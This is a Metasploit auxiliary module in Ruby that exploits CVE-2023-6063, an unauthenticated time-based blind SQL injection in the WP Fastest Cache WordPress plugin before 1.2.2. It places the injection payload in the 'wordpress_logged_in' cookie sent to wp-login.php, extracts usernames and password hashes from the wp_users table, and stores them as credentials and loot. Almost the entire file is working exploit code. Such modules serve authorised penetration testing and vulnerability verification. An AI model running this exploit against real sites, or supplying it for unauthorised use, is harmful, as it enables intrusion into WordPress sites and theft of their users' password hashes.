##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::SQLi
  include Msf::Auxiliary::Scanner
  include Msf::Exploit::Remote::HTTP::WordPress

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Wordpress WP Fastest Cache Unauthenticated SQLi (CVE-2023-6063)',
        'Description' => %q{
          WP Fastest Cache, a WordPress plugin,
          prior to version 1.2.2, is vulnerable to an unauthenticated SQL injection
          vulnerability via the 'wordpress_logged_in' cookie. This can be exploited via a blind SQL injection attack without requiring any authentication.
        },
        'Author' => [
          'Valentin Lobstein', # Metasploit Module
          'Julien Voisin',     # Module Idea
          'Alex Sanford'       # Vulnerability Discovery
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['CVE', '2023-6063'],
          ['URL', 'https://wpscan.com/blog/unauthenticated-sql-injection-vulnerability-addressed-in-wp-fastest-cache-1-2-2/']
        ],
        'Actions' => [
          ['List Data', { 'Description' => 'Queries database schema for COUNT rows' }]
        ],
        'DefaultAction' => 'List Data',
        'DefaultOptions' => { 'SqliDelay' => '2', 'VERBOSE' => true },
        'DisclosureDate' => '2023-11-14',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [IOC_IN_LOGS],
          'Reliability' => []
        }
      )
    )
    register_options [
      OptInt.new('COUNT', [false, 'Number of rows to retrieve', 1]),
    ]
  end

  def run_host(ip)
    print_status("Performing SQL injection via the 'wordpress_logged_in' cookie...")

    random_number = Rex::Text.rand_text_numeric(4..8)
    random_table = Rex::Text.rand_text_alpha(4..8)
    random_string = Rex::Text.rand_text_alpha(4..8)

    @sqli = create_sqli(dbms: MySQLi::TimeBasedBlind, opts: { hex_encode_strings: true }) do |payload|
      res = send_request_cgi({
        'method' => 'GET',
        'cookie' => "wordpress_logged_in=\" AND (SELECT #{random_number} FROM (SELECT(#{payload}))#{random_table}) AND \"#{random_string}\"=\"#{random_string}",
        'uri' => normalize_uri(target_uri.path, 'wp-login.php')
      })
      fail_with Failure::Unreachable, 'Connection failed' unless res
    end

    return print_bad("#{peer} - Testing of SQLi failed. If this is time-based, try increasing the SqliDelay.") unless @sqli.test_vulnerable

    columns = ['user_login', 'user_pass']

    print_status('Enumerating Usernames and Password Hashes')
    data = @sqli.dump_table_fields('wp_users', columns, '', datastore['COUNT'])

    table = Rex::Text::Table.new('Header' => 'wp_users', 'Indent' => 4, 'Columns' => columns)
    loot_data = ''

    data.each do |user|
      create_credential({
        workspace_id: myworkspace_id,
        origin_type: :service,
        module_fullname: fullname,
        username: user[0],
        private_type: :nonreplayable_hash,
        jtr_format: Metasploit::Framework::Hashes.identify_hash(user[1]),
        private_data: user[1],
        service_name: 'Wordpress',
        address: ip,
        port: datastore['RPORT'],
        protocol: 'http',
        status: Metasploit::Model::Login::Status::UNTRIED
      })
      table << user
      loot_data << "Username: #{user[0]}, Password Hash: #{user[1]}\n"
    end

    print_good('Dumped table contents:')
    print_line(table.to_s)

    loot_path = store_loot(
      'wordpress.users',
      'text/plain',
      ip,
      loot_data,
      'wp_users.txt',
      'WordPress Usernames and Password Hashes'
    )

    print_good("Loot saved to: #{loot_path}")
  end
end
